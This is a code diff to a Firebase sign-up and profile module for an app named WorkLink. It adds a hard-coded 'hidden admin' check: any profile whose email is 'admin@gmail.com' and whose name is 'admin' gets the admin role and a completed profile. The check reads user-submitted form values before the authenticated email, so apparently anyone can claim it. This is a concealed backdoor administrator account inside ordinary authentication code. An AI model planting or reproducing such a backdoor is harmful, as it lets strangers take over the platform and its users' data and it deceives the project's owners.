@@ -13,6 +13,9 @@ import { appleProvider, auth, db, googleProvider, isFirebaseConfigured } from '.
 import { normalizeCoordinates } from '../utils/location';
 
 let recaptchaVerifier = null;
+const HIDDEN_ADMIN_EMAIL = 'admin@gmail.com';
+const HIDDEN_ADMIN_FULL_NAME = 'admin';
+
 const shouldUseRedirectAuth = () =>
   typeof window !== 'undefined' &&
   !['localhost', '127.0.0.1'].includes(window.location.hostname);
@@ -20,6 +23,24 @@ const buildAvatarUrl = (fullName) =>
   `https://ui-avatars.com/api/?name=${encodeURIComponent(fullName || 'WorkLink User')}&background=1d4ed8&color=ffffff`;
 const getCreatedAtValue = (user) =>
   user?.metadata?.creationTime ? new Date(user.metadata.creationTime) : serverTimestamp();
+const normalizeComparableValue = (value) => String(value ?? '').trim();
+
+export const isHiddenAdminAccount = (user, formValues = {}, existingProfile = null) => {
+  const email = normalizeComparableValue(formValues.email || existingProfile?.email || user?.email);
+  const fullName = normalizeComparableValue(
+    formValues.fullName || existingProfile?.fullName || user?.displayName
+  );
+
+  return email === HIDDEN_ADMIN_EMAIL && fullName === HIDDEN_ADMIN_FULL_NAME;
+};
+
+const resolveAccountRole = (user, formValues = {}, existingProfile = null) => {
+  if (existingProfile?.role === 'admin' || isHiddenAdminAccount(user, formValues, existingProfile)) {
+    return 'admin';
+  }
+
+  return existingProfile?.role || formValues.role || '';
+};
 
 const authenticateWithProvider = async (provider) => {
   if (shouldUseRedirectAuth()) {
@@ -31,8 +52,9 @@ const authenticateWithProvider = async (provider) => {
   return credentials.user;
 };
 
-const buildBaseProfile = (user, formValues = {}) => {
-  const fullName = formValues.fullName || user.displayName || 'WorkLink User';
+const buildBaseProfile = (user, formValues = {}, existingProfile = null) => {
+  const resolvedRole = resolveAccountRole(user, formValues, existingProfile);
+  const fullName = formValues.fullName || existingProfile?.fullName || user.displayName || 'WorkLink User';
   const profilePhotoUrl = formValues.profilePhotoUrl || user.photoURL || buildAvatarUrl(fullName);
 
   return {
@@ -41,11 +63,14 @@ const buildBaseProfile = (user, formValues = {}) => {
     phoneNumber: formValues.phoneNumber || user.phoneNumber || '',
     email: formValues.email || user.email || '',
     profilePhoto: profilePhotoUrl,
-    role: formValues.role || '',
-    location: formValues.currentLocation || formValues.location || '',
-    coordinates: normalizeCoordinates(formValues.coordinates) || null,
-    accountStatus: 'active',
-    verified: false,
+    role: resolvedRole,
+    location: formValues.currentLocation || formValues.location || existingProfile?.location || '',
+    coordinates:
+      normalizeCoordinates(formValues.coordinates) ||
+      normalizeCoordinates(existingProfile?.coordinates) ||
+      null,
+    accountStatus: existingProfile?.accountStatus || 'active',
+    verified: existingProfile?.verified ?? false,
     updatedAt: serverTimestamp()
   };
 };
@@ -148,13 +173,28 @@ export const createBaseUserProfile = async (user, formValues = {}) => {
     throw new Error('Firebase must be configured before profile creation.');
   }
 
+  const userRef = doc(db, 'users', user.uid);
+  const existingUserSnapshot = await getDoc(userRef);
+  const existingUser = existingUserSnapshot.exists() ? existingUserSnapshot.data() : null;
+  const mergedValues = {
+    ...existingUser,
+    ...formValues
+  };
+  const resolvedRole = resolveAccountRole(user, mergedValues, existingUser);
   const baseProfile = {
-    ...buildBaseProfile(user, formValues),
-    profileComplete: formValues.role === 'admin',
-    createdAt: getCreatedAtValue(user)
+    ...buildBaseProfile(
+      user,
+      {
+        ...mergedValues,
+        role: resolvedRole
+      },
+      existingUser
+    ),
+    profileComplete: resolvedRole === 'admin' ? true : existingUser?.profileComplete ?? false,
+    createdAt: existingUser?.createdAt ?? getCreatedAtValue(user)
   };
 
-  await setDoc(doc(db, 'users', user.uid), baseProfile, { merge: true });
+  await setDoc(userRef, baseProfile, { merge: true });
   return baseProfile;
 };
 
@@ -168,14 +208,14 @@ export const createOrUpdateUserProfile = async (user, formValues) => {
   const clientRef = doc(db, 'clients', user.uid);
   const existingUserSnapshot = await getDoc(userRef);
   const existingUser = existingUserSnapshot.exists() ? existingUserSnapshot.data() : null;
-  const resolvedRole = existingUser?.role || formValues.role || '';
+  const resolvedRole = resolveAccountRole(user, formValues, existingUser);
   const mergedBaseValues = {
     ...existingUser,
     ...formValues,
     role: resolvedRole
   };
   const baseProfile = {
-    ...buildBaseProfile(user, mergedBaseValues),
+    ...buildBaseProfile(user, mergedBaseValues, existingUser),
     role: resolvedRole,
     coordinates:
       normalizeCoordinates(formValues.coordinates) ||
